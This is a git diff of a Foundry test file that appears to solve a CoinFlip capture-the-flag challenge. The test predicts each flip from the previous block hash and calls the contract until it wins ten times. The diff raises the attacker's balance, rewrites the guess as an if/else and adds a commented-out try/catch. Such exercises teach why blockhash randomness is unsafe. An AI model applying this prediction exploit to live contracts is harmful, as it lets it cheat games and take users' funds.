@@ -13,13 +13,12 @@ contract CoinFlipTest is Test, DeployCoinFlipScript {
 
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
-
     function setUp() public {
 
         deployer = msg.sender;
 
         vm.deal(deployer, 1 ether);
-        vm.deal(attacker, 1 ether);
+        vm.deal(attacker, 10 ether);
 
         vm.label(deployer, "Deployer");
         vm.label(attacker, "Attacker");
@@ -30,13 +29,28 @@ contract CoinFlipTest is Test, DeployCoinFlipScript {
     function test_isSolved() public {
         vm.startPrank(attacker);
 
-        while (coinflipChallenge.consecutiveWins()<10) {
+        while (coinflipChallenge.consecutiveWins()< 10) {
 
             uint256 blockValue = uint256(blockhash(block.number - 1));
             uint256 coinFlip = blockValue / FACTOR;
             bool side = coinFlip == 1 ? true : false;
 
-            coinflipChallenge.flip(side);
+            if (side) {
+                coinflipChallenge.flip(true); 
+            } else {
+                coinflipChallenge.flip(false);
+            }
+
+
+            // try coinflipChallenge.flip(side) returns (bool isFlip) {
+            //     // vm.roll(block.number + 1);
+            // } catch {
+            //     coinflipChallenge.flip(!side);
+            //     // vm.roll(block.number + 1);
+
+            // }
+
+            // coinflipChallenge.flip(side);
             vm.roll(block.number + 1);
 
         }
